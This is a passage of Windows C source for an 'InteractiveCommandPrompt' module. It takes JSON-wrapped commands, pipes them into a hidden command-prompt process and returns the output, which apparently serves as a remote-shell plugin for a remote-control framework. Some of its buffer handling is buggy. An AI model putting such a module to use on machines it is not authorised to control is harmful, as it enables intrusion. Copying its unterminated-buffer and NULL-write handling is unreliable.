			//		DEBUG_ERROR,
			//		TEXT("cJSON_Print(%p) failed."),
			//		lpJsonInteractiveCommandPromptInitializeOutput
			//	);
			//	__leave;
			//}
			//DBGPRINT(DEBUG_VERBOSE, TEXT("szInteractiveCommandPromptOutput:     %p"), szInteractiveCommandPromptOutput);
			////printf("szInteractiveCommandPromptOutput:\n%s\n", szInteractiveCommandPromptOutput);
			//dwInteractiveCommandPromptOutputSize = (DWORD)strlen(szInteractiveCommandPromptOutput);

			//(*lppOutputBuffer) = (LPBYTE)szInteractiveCommandPromptOutput;
			//(*lpdwOutputBufferSize) = dwInteractiveCommandPromptOutputSize;

		} // end try-finally
		__finally
		{
			// Delete input and output JSON objects
			if (NULL != lpJsonInteractiveCommandPromptInitializeInput)
			{
				cJSON_Delete(lpJsonInteractiveCommandPromptInitializeInput);
				lpJsonInteractiveCommandPromptInitializeInput = NULL;
			}
			if (NULL != lpJsonInteractiveCommandPromptInitializeOutput)
			{
				cJSON_Delete(lpJsonInteractiveCommandPromptInitializeOutput);
				lpJsonInteractiveCommandPromptInitializeOutput = NULL;
			}

			DBGPRINT(DEBUG_VERBOSE, TEXT("end"));
		} // end finally
	} // end try-except
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		dwErrorCode = GetExceptionCode();
		DBGPRINT(DEBUG_ERROR, TEXT("Exception occurred. (%08x)"), dwErrorCode);
	} // end except

	return dwErrorCode;
}


DWORD WINAPI InteractiveCommandPromptFinalization(
	IN	PBYTE	lpInputBuffer,
	IN	DWORD	dwInputBufferSize,
	OUT PBYTE*	lppOutputBuffer,
	OUT PDWORD	lpdwOutputBufferSize
)
{
	DWORD	dwErrorCode = ERROR_SUCCESS;
	DWORD	dwTempErrorCode = ERROR_SUCCESS;

	CHAR*	szInteractiveCommandPromptInput = NULL;
	DWORD	dwInteractiveCommandPromptInputSize = 0;
	cJSON*	lpJsonInput = NULL;
	cJSON*	lpJsonMessageType = NULL;

	BOOL	bRegisterResult = FALSE;

	PBYTE	pBuffer = NULL;
	int		nBufferSize = 0;

	CHAR*	szInteractiveCommandPromptOutput = NULL;
	DWORD	dwInteractiveCommandPromptOutputSize = 0;
	cJSON*	lpJsonInteractiveCommandPromptOutput = NULL;

	__try
	{
		__try
		{
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpInputBuffer:        %p"), lpInputBuffer);
			DBGPRINT(DEBUG_VERBOSE, TEXT("dwInputBufferSize:    %d"), dwInputBufferSize);
			DBGPRINT(DEBUG_VERBOSE, TEXT("lppOutputBuffer:      %p"), lppOutputBuffer);
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpdwOutputBufferSize: %p"), lpdwOutputBufferSize);

			/********************************************************************************
				Check arguments
			********************************************************************************/
			//if (NULL == lppOutputBuffer)
			//{
			//	dwErrorCode = ERROR_BAD_ARGUMENTS;
			//	DBGPRINT(
			//		DEBUG_ERROR,
			//		TEXT("lppOutputBuffer is NULL.\n")
			//	);
			//	__leave;
			//}
			//if (NULL == lpInputBuffer)
			//{
			//	dwErrorCode = ERROR_BAD_ARGUMENTS;
			//	DBGPRINT(
			//		DEBUG_ERROR,
			//		TEXT("lpInputBuffer is NULL.\n")
			//	);
			//	__leave;
			//}
			//szInteractiveCommandPromptInput = (char*)lpInputBuffer;
			//dwInteractiveCommandPromptInputSize = dwInputBufferSize;


			/********************************************************************************
				Unregister callback functions
			********************************************************************************/
			DBGPRINT(DEBUG_VERBOSE, TEXT("Unregister InteractiveCommandPrompt_Request"));
			bRegisterResult = UnregisterModuleMessageHandler(
				g_InteractiveCommandPrompt_lpJsonInteractiveCommandPromptConfig,
				InteractiveCommandPrompt_Request
			);
			if (FALSE == bRegisterResult)
			{
				//dwErrorCode = ERROR_BAD_PROVIDER;
				DBGPRINT(
					DEBUG_WARNING,
					TEXT("UnregisterModuleMessageHandler(%p, %S) failed."),
					g_InteractiveCommandPrompt_lpJsonInteractiveCommandPromptConfig,
					InteractiveCommandPrompt_Request
				);
				//__leave;
			}
			else
			{
				DBGPRINT(DEBUG_VERBOSE, TEXT("Unregister InteractiveCommandPrompt_Request was successful."));
			}


			/********************************************************************************
				Perform additional Finalization actions
			********************************************************************************/
			if (FALSE == m_InteractiveCommandPrompt_GetExitCodeProcess(g_InteractiveCommandPrompt_CommandPromptProcessInfo.hProcess, &dwTempErrorCode))
			{
				dwTempErrorCode = GetLastError();
				DBGPRINT(DEBUG_ERROR, TEXT("m_InteractiveCommandPrompt_GetExitCodeProcess( %p, %p ) failed. (%08x)"), g_InteractiveCommandPrompt_CommandPromptProcessInfo.hProcess, &dwTempErrorCode, dwTempErrorCode);
				//__leave;
			}
			if (STILL_ACTIVE == dwTempErrorCode)
			{
				DBGPRINT(DEBUG_VERBOSE, TEXT("Still active, so terminate process: %p (PID:%d)"), g_InteractiveCommandPrompt_CommandPromptProcessInfo.hProcess, g_InteractiveCommandPrompt_CommandPromptProcessInfo.dwProcessId);
				if (NULL != g_InteractiveCommandPrompt_CommandPromptProcessInfo.hProcess)
				{

					DBGPRINT(DEBUG_VERBOSE, TEXT("m_InteractiveCommandPrompt_TerminateProcess( %p, %08x )..."), g_InteractiveCommandPrompt_CommandPromptProcessInfo.hProcess, ERROR_SUCCESS);
					if (FALSE == m_InteractiveCommandPrompt_TerminateProcess(g_InteractiveCommandPrompt_CommandPromptProcessInfo.hProcess, ERROR_SUCCESS))
					{
						dwTempErrorCode = GetLastError();
						DBGPRINT(DEBUG_ERROR, TEXT("m_InteractiveCommandPrompt_TerminateProcess( %p, %08x ) failed. (%08x)"), g_InteractiveCommandPrompt_CommandPromptProcessInfo.hProcess, ERROR_SUCCESS, dwTempErrorCode);
						//__leave;
					}
				}
			}


			/********************************************************************************
				Finalize internal functions
			********************************************************************************/
			//DBGPRINT(DEBUG_VERBOSE, TEXT("Finalize_InteractiveCommandPrompt_Kernel32_Functions()"));
			dwErrorCode = Finalize_InteractiveCommandPrompt_Kernel32_Functions();
			if (ERROR_SUCCESS != dwErrorCode)
			{
				DBGPRINT(DEBUG_ERROR, TEXT("Finalize_InteractiveCommandPrompt_Kernel32_Functions() failed.(%08x)"), dwErrorCode);
				__leave;
			}

			//DBGPRINT(DEBUG_VERBOSE, TEXT("Finalize_InteractiveCommandPrompt_Advapi32_Functions()"));
			dwErrorCode = Finalize_InteractiveCommandPrompt_Advapi32_Functions();
			if (ERROR_SUCCESS != dwErrorCode)
			{
				DBGPRINT(DEBUG_ERROR, TEXT("Finalize_InteractiveCommandPrompt_Advapi32_Functions() failed.(%08x)"), dwErrorCode);
				__leave;
			}

			
		} // end try-finally
		__finally
		{
			/********************************************************************************
				Delete local JSON config
			********************************************************************************/
			if (NULL != g_InteractiveCommandPrompt_lpJsonInteractiveCommandPromptConfig)
			{
				cJSON_Delete(g_InteractiveCommandPrompt_lpJsonInteractiveCommandPromptConfig);
				g_InteractiveCommandPrompt_lpJsonInteractiveCommandPromptConfig = NULL;
			}

			DBGPRINT(DEBUG_VERBOSE, TEXT("end"));
		} // end finally
	} // end try-except
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		dwErrorCode = GetExceptionCode();
		DBGPRINT(DEBUG_ERROR, TEXT("Exception occurred. (%08x)"), dwErrorCode);
	} // end except

	return dwErrorCode;
}


DWORD WINAPI InteractiveCommandPromptCallbackInterface(
	IN LPBYTE	lpInputBuffer,
	IN DWORD	dwInputBufferSize,
	OUT LPBYTE* lppOutputBuffer,
	OUT LPDWORD lpdwOutputBufferSize
)
{
	DWORD	dwErrorCode = ERROR_SUCCESS;
	DWORD	dwTempErrorCode = ERROR_SUCCESS;

	CHAR*	szInteractiveCommandPromptInput = NULL;
	DWORD	dwInteractiveCommandPromptInputSize = 0;
	cJSON*	lpJsonInput = NULL;
	cJSON*	lpJsonInteractiveCommandPromptRequestCommandInput = NULL;
	LPSTR	szCommandLine = NULL;

	LPSTR	szCommandBuffer = NULL;
	DWORD	dwCommandBufferSize = 0;
	DWORD	dwPipeBytes = 0;
	CHAR	chBuf[BUFSIZE];
	DWORD	dwPreviousOutputMessageDataSize = 0;
	LPSTR	lpPreviousOutputMessageData = NULL;
	DWORD	dwOutputMessageDataSize = 0;
	LPSTR	lpOutputMessageData = NULL;

	CHAR*	szInteractiveCommandPromptOutput = NULL;
	DWORD	dwInteractiveCommandPromptOutputSize = 0;
	cJSON*	lpJsonInteractiveCommandPromptOutput = NULL;
	cJSON*	lpJsonInteractiveCommandPromptResponseCommandOutput = NULL;
	

	__try
	{
		__try
		{
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpInputBuffer:        %p"), lpInputBuffer);
			DBGPRINT(DEBUG_VERBOSE, TEXT("dwInputBufferSize:    %d"), dwInputBufferSize);
			DBGPRINT(DEBUG_VERBOSE, TEXT("lppOutputBuffer:      %p"), lppOutputBuffer);
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpdwOutputBufferSize: %p"), lpdwOutputBufferSize);


			/********************************************************************************
				Check arguments
			********************************************************************************/
			if (NULL == lppOutputBuffer)
			{
				dwErrorCode = ERROR_BAD_ARGUMENTS;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lppOutputBuffer is NULL.\n")
				);
				__leave;
			}
			if (NULL == lpInputBuffer)
			{
				dwErrorCode = ERROR_BAD_ARGUMENTS;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpInputBuffer is NULL.\n")
				);
				__leave;
			}
			szInteractiveCommandPromptInput = (char*)lpInputBuffer;
			dwInteractiveCommandPromptInputSize = dwInputBufferSize;
			

			/********************************************************************************
				Parse input arguments
			********************************************************************************/
			lpJsonInput = cJSON_Parse(szInteractiveCommandPromptInput);
			if (NULL == lpJsonInput)
			{
				dwErrorCode = ERROR_BAD_ARGUMENTS;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_Parse(%p) failed."),
					lpInputBuffer
				);
				__leave;
			}


			/********************************************************************************
				Create the output JSON object
			********************************************************************************/
			// Create the output JSON object
			lpJsonInteractiveCommandPromptOutput = cJSON_CreateObject();
			if (NULL == lpJsonInteractiveCommandPromptOutput)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonInteractiveCommandPromptOutput = cJSON_CreateObject failed.\n")
				);
				__leave;
			}


			/********************************************************************************
				Perform action given input parameters
			********************************************************************************/
			
			lpJsonInteractiveCommandPromptRequestCommandInput = cJSON_GetObjectItemCaseSensitive(lpJsonInput, InteractiveCommandPrompt_Request_CommandInput);
			if (NULL == lpJsonInteractiveCommandPromptRequestCommandInput)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_GetObjectItemCaseSensitive(%p, %S) failed."),
					lpJsonInput,
					InteractiveCommandPrompt_Request_CommandInput
				);
				__leave;
			}


			// Make sure that the request entry JSON object is a string
			if (
				(!cJSON_IsString(lpJsonInteractiveCommandPromptRequestCommandInput)) ||
				(NULL == lpJsonInteractiveCommandPromptRequestCommandInput->valuestring)
				)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_WARNING,
					TEXT("cJSON_IsString(%p) failed."),
					lpJsonInteractiveCommandPromptRequestCommandInput
				);
				//continue;
				__leave;
			}
					
			szCommandLine = lpJsonInteractiveCommandPromptRequestCommandInput->valuestring;
			//DBGPRINT(DEBUG_VERBOSE, TEXT("szCommandLine: %S"), szCommandLine);

			if (NULL == strstr(szCommandLine, SZ_InteractiveCommandPrompt_COMMAND_LINE_TERMINATOR))
			{	
				dwCommandBufferSize = 
					(DWORD)strlen(szCommandLine) + 
					(DWORD)strlen(SZ_InteractiveCommandPrompt_COMMAND_LINE_TERMINATOR) + 
					1;
				dwErrorCode = ALLOC(dwCommandBufferSize, (LPVOID*)&szCommandBuffer);
				if (ERROR_SUCCESS != dwErrorCode)
				{
					DBGPRINT(
						DEBUG_ERROR,
						TEXT("ALLOC( %d, %p ) failed. (%08x)"),
						dwCommandBufferSize,
						(LPVOID*)&szCommandBuffer,
						dwErrorCode
					);
					__leave;
				}
				strcpy(szCommandBuffer, szCommandLine);
				strcat(szCommandBuffer, SZ_InteractiveCommandPrompt_COMMAND_LINE_TERMINATOR);
			}
			DBGPRINT(DEBUG_VERBOSE, TEXT("szCommandBuffer:        %S"), szCommandBuffer);

			// Write message data contents to the parent's write end of the stdin pipe
			//DBGPRINT(
			//	DEBUG_VERBOSE,
			//	TEXT("WriteFile( %p, %p, %d, %p, %p )..."),
			//	hChildStd_IN_Wr,
			//	szCommandBuffer,
			//	dwCommandBufferSize,
			//	&dwPipeBytes,
			//	NULL
			//);
			if (FALSE == WriteFile(
				hParentStd_IN_Wr,
				szCommandBuffer,
				dwCommandBufferSize-1,
				&dwPipeBytes,
				NULL
			)
				)
			{
				dwErrorCode = GetLastError();
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("WriteFile( %p, %p, %d, %p, %p ) failed. (%08x)"),
					hParentStd_IN_Wr,
					szCommandBuffer,
					dwCommandBufferSize,
					&dwPipeBytes,
					NULL,
					dwErrorCode
				);
				__leave;
			}
			// Read output from the parent's read end of the stdout pipe
			while(true)
			{
				ZeroMemory(chBuf, sizeof(chBuf));
				dwPipeBytes = 0;
				// Sleep a litte bit to allow the child process to generate some stdout
				Sleep(DW_COMMAND_WAIT_TIME_MS);
				// First check to see if there are any bytes to read from the stdout pipe
				if (FALSE == m_InteractiveCommandPrompt_PeekNamedPipe(hParentStd_OUT_Rd, NULL, 0, NULL, &dwPipeBytes, NULL))
				{
					if (0 == dwPipeBytes)
					{
						//DBGPRINT(DEBUG_ERROR, TEXT("No more bytes to read"));
						break;
					}
					else
					{
						dwErrorCode = GetLastError();
						DBGPRINT(
							DEBUG_ERROR,
							TEXT("m_InteractiveCommandPrompt_PeekNamedPipe( %p, %p, %d, %p, %p, %p ) failed. (%08x)"),
							hParentStd_OUT_Rd,
							NULL,
							0,
							NULL,
							&dwPipeBytes,
							NULL,
							dwErrorCode
						);
						__leave;
					}
				}
				//DBGPRINT(DEBUG_VERBOSE, TEXT("dwPipeBytes:    %d"), dwPipeBytes);
				if (0 == dwPipeBytes)
				{
					//DBGPRINT(DEBUG_VERBOSE, TEXT("Peeked, and no more bytes to read"));
					break;
				}
				// Read the bytes from the parent's read end of the stdout pipe
				if (FALSE == ReadFile(hParentStd_OUT_Rd, chBuf, BUFSIZE, &dwPipeBytes, NULL))
				{
					if (0 == dwPipeBytes)
					{
						//DBGPRINT(DEBUG_VERBOSE, TEXT("ReadFile, and no more bytes to read"));
						break;
					}
					else
					{
						dwErrorCode = GetLastError();
						DBGPRINT(
							DEBUG_ERROR,
							TEXT("ReadFile( %p, %p, %d, %p, %p ) failed. (%08x)"),
							hParentStd_OUT_Rd,
							chBuf,
							BUFSIZE,
							&dwPipeBytes,
							NULL,
							dwErrorCode
						);
						__leave;
					}
				}
				//DBGPRINT(DEBUG_VERBOSE, TEXT("dwPipeBytes:    %d"), dwPipeBytes);
				//dwErrorCode = GetLastError();
				//DBGPRINT(DEBUG_VERBOSE, TEXT("dwErrorCode:    %d (%08x)"), dwErrorCode, dwErrorCode);

					
				// Append these bytes to the overall output buffer
				dwPreviousOutputMessageDataSize = dwOutputMessageDataSize;
				dwOutputMessageDataSize += dwPipeBytes;
				lpPreviousOutputMessageData = lpOutputMessageData;
				dwErrorCode = ALLOC(dwOutputMessageDataSize, (LPVOID*)&lpOutputMessageData);
				if (ERROR_SUCCESS != dwErrorCode)
				{
					DBGPRINT(
						DEBUG_ERROR,
						TEXT("ALLOC( %d, %p ) failed. (%08x)"),
						dwOutputMessageDataSize,
						(LPVOID*)&lpOutputMessageData,
						dwErrorCode
					);
					__leave;
				}
				if (NULL != lpPreviousOutputMessageData)
				{
					memcpy(lpOutputMessageData, lpPreviousOutputMessageData, dwPreviousOutputMessageDataSize);
					dwErrorCode = FREE(lpPreviousOutputMessageData);
					if (ERROR_SUCCESS != dwErrorCode)
					{
						DBGPRINT(
							DEBUG_ERROR,
							TEXT("FREE( %p ) failed. (%08x)"),
							lpPreviousOutputMessageData,
							dwErrorCode
						);
						__leave;
					}
					lpPreviousOutputMessageData = NULL;
				}
				memcpy(lpOutputMessageData + dwPreviousOutputMessageDataSize, chBuf, dwPipeBytes);
				dwPreviousOutputMessageDataSize = 0;
				// Continue reading from the parent's end of the stdout pipe until there are no more bytes to read
			} // end for loop reading output from child process
			//DBGPRINT(DEBUG_VERBOSE, TEXT("dwOutputMessageDataSize:    %d"), dwOutputMessageDataSize);
			//DBGPRINT(DEBUG_VERBOSE, TEXT("lpOutputMessageData:        %p"), lpOutputMessageData);
			//DBGPRINT(DEBUG_VERBOSE, TEXT("lpOutputMessageData:        %S"), (LPSTR)lpOutputMessageData);

				
			// Create the command output
			lpJsonInteractiveCommandPromptResponseCommandOutput = cJSON_CreateString(lpOutputMessageData);
			if (NULL == lpJsonInteractiveCommandPromptResponseCommandOutput)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonInteractiveCommandPromptResponseCommandOutput = cJSON_CreateString failed.\n")
				);
				__leave;
			}
			// Add the command output to the interactive_command_prompt_request output	
			cJSON_AddItemToObject(lpJsonInteractiveCommandPromptOutput, InteractiveCommandPrompt_Response_CommandOutput, lpJsonInteractiveCommandPromptResponseCommandOutput);

			// Free the buffers associated with the current InteractiveCommandPromptEntry
			if (NULL != lpPreviousOutputMessageData)
			{
				FREE(lpPreviousOutputMessageData);
				lpPreviousOutputMessageData = NULL;
			}
			if (NULL != lpOutputMessageData)
			{
				FREE(lpOutputMessageData);
				lpOutputMessageData = NULL;
			}


			/********************************************************************************
				Create output message based on results
			********************************************************************************/
			//DBGPRINT(DEBUG_VERBOSE, TEXT("Create output message based on results"));
			szInteractiveCommandPromptOutput = cJSON_Print(lpJsonInteractiveCommandPromptOutput);
			if (NULL == szInteractiveCommandPromptOutput)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_Print(%p) failed."),
					lpJsonInteractiveCommandPromptOutput
				);
				__leave;
			}
			dwInteractiveCommandPromptOutputSize = (DWORD)strlen(szInteractiveCommandPromptOutput);
			//DBGPRINT(DEBUG_VERBOSE, TEXT("dwInteractiveCommandPromptOutputSize: %d"), dwInteractiveCommandPromptOutputSize);
			//DBGPRINT(DEBUG_VERBOSE, TEXT("szInteractiveCommandPromptOutput:     %p"), szInteractiveCommandPromptOutput);
			//printf("szInteractiveCommandPromptOutput:\n%s\n", szInteractiveCommandPromptOutput);

			(*lppOutputBuffer) = (LPBYTE)szInteractiveCommandPromptOutput;
			(*lpdwOutputBufferSize) = dwInteractiveCommandPromptOutputSize;

		} // end try-finally
		__finally
		{
			if (NULL != lpJsonInput)
			{
				cJSON_Delete(lpJsonInput);
				lpJsonInput = NULL;
			}

			if (NULL != lpJsonInteractiveCommandPromptOutput)
			{
				cJSON_Delete(lpJsonInteractiveCommandPromptOutput);
				lpJsonInteractiveCommandPromptOutput = NULL;
			}

			if (ERROR_SUCCESS != dwErrorCode)
			{
				if (NULL != (*lppOutputBuffer))
				{
					//dwTempErrorCode = FREE(*lppOutputBuffer);
					//if (ERROR_SUCCESS != dwTempErrorCode)
					//{
					//	DBGPRINT(DEBUG_ERROR, TEXT("FREE failed.(%08x)"), dwTempErrorCode);
					//}

					cJSON_free(szInteractiveCommandPromptOutput);
					*lppOutputBuffer = NULL;
				}
				*lpdwOutputBufferSize = 0;
			}

			DBGPRINT(DEBUG_VERBOSE, TEXT("end"));
		} // end finally
	} // end try-except
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		dwErrorCode = GetExceptionCode();
		DBGPRINT(DEBUG_ERROR, TEXT("Exception occurred. (%08x)"), dwErrorCode);
	} // end except

	return dwErrorCode;
}
